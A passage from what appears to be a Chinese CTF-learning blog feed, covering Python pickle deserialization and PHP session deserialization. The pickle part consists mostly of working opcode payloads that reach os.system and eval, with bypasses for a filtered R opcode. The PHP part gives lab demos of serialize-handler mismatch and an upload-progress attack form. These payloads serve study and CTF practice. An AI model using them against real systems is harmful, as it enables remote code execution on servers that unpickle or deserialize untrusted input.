class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>用pker写成opcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&quot;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS&#x27;get&#x27;\ntRp2\n0csys\nmodules\np3\n0g2\n(g3\nS&#x27;os&#x27;\ntRp4\n0g0\n(g4\nS&#x27;system&#x27;\ntRp5\n0g5\n(S&#x27;whoami&#x27;\ntR.&quot;</span></span><br></pre></td></tr></table></figure>



<ul>
<li><h6 id="利用builtins-globals-获取危险函数"><a href="#利用builtins-globals-获取危险函数" class="headerlink" title="利用builtins.globals()获取危险函数."></a>利用<code>builtins.globals()</code>获取危险函数.</h6></li>
</ul>
<p>还可以用builtins的<code>globals()</code>方法获取危险函数.<code>globals()</code>方法返回一个字典</p>
<blockquote>
<p>返回的字典包含了所有全局作用域内的名称（键）及其对应的值（值）.这个字典反映了当前模块全局命名空间的状态</p>
</blockquote>
<p>其中固然也包含了一些危险模块.</p>
<p>pker的输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">globa1=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;globals&quot;</span>)</span><br><span class="line">glob=globa1()</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;dict&quot;</span>)</span><br><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;getattr&quot;</span>)</span><br><span class="line">get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&quot;get&quot;</span>)</span><br><span class="line">builtins=get(glob,<span class="string">&quot;__builtins__&quot;</span>)</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(builtins,<span class="string">&quot;eval&quot;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>生成的opcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output=<span class="string">b&#x27;cbuiltins\nglobals\np0\n0g0\n(tRp1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0g3\n(g2\nS\&#x27;get\&#x27;\ntRp4\n0g4\n(g1\nS\&#x27;__builtins__\&#x27;\ntRp5\n0g3\n(g5\nS\&#x27;eval\&#x27;\ntRp6\n0g6\n(S\&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)\&#x27;\ntR.&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>R</code>操作符被过滤时,可以使用如下payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;calc&quot;)o00.</span></span><br></pre></td></tr></table></figure>



<ul>
<li>还有未知模块的payload:</li>
</ul>
<p>如下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p0                    #取到 getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)Rp2                  # getattr(dict, &#x27;get&#x27;)</span></span><br><span class="line"><span class="string">00g1</span></span><br><span class="line"><span class="string">(g2</span></span><br><span class="line"><span class="string">S&#x27;__builtins__&#x27;       # get(__import__(&#x27;builtins&#x27;).globals(), &#x27;__builtins__&#x27;)</span></span><br><span class="line"><span class="string">tRp3</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;    # 取到 eval 然后实现 RCE</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>同时限制R指令时可以使用下面的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;whoami&quot;)o00.&#x27;</span></span><br><span class="line"><span class="comment">#最后两个0是栈为空，否则会报错</span></span><br></pre></td></tr></table></figure>

<p>在pycharm上测试不知道为啥whami可以执行，但是就是不能执行dir（后面有题再测试一下）</p>
<h6 id="R指令被过滤"><a href="#R指令被过滤" class="headerlink" title="R指令被过滤"></a>R指令被过滤</h6><p>除了<code>o</code>、<code>i</code>，还可以使用<code>b</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br></pre></td></tr></table></figure>

<p>代码跟进<a href="https://xz.aliyun.com/t/11807?time__1311=mqmx0DBD90qWqGNqeeqBKfdLAAh2x7Kx&alichlgref=https://cn.bing.com/">参考文章</a></p>
<p>利用示例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,age</span>):</span><br><span class="line">        self.age=age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Person</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;calc&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p=pickle.loads(opcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="利用python内置函数绕过"><a href="#利用python内置函数绕过" class="headerlink" title="利用python内置函数绕过"></a>利用python内置函数绕过</h6><p>题目参考 <strong>美团CTF 2022 ezpickle</strong> 和 蓝帽杯2022 file_session和HITB Python_revenge writeup</p>
<p>可以利用map函数和filter函数</p>
<p>注意这两个函数都返回一个迭代器,所以我们需要使用<code>list()</code>函数将其变为一个列表输出.</p>
<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span>(<span class="built_in">eval</span>,[<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)])</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">eval</span>,[<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>opcode如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">tuple</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>还有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">bytes</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>pickle反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>session反序列化学习</title>
    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>好用，爱用，多用</p>
<span id="more"></span>

<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
<p><strong>PHP session：</strong></p>
<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>



<ul>
<li>session.save_handler&#x3D;””</li>
</ul>
<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
<ul>
<li><strong>session.serialize_handler</strong></li>
</ul>
<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
<p>并且文件的内容始终是session值的序列化之后的内容。</p>
<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>

<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
<ul>
<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
</li>
<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
</li>
</ul>
<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
<p>测试一下，demo如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
<p>demo改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
<p>两张图片可以对比一下</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
<p>flag.php：</p>
<p>这个页面用于接受session的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.php：</p>
<p>这个页面用于测试反序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先访问1.php，输出</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
<p>在电脑上看一看此时session的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到成功写入，这是再访问以下1.php</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
<p>成功反序。</p>
<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
<ul>
<li>两个文件session引擎配置不同</li>
<li>其中一个session可控</li>
<li>两个文件同域</li>
</ul>
<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
<p>条件：</p>
<ol>
<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
</ol>
<p>这两个都是可在查的</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
<p><strong>对session上传进度说明一下：</strong></p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
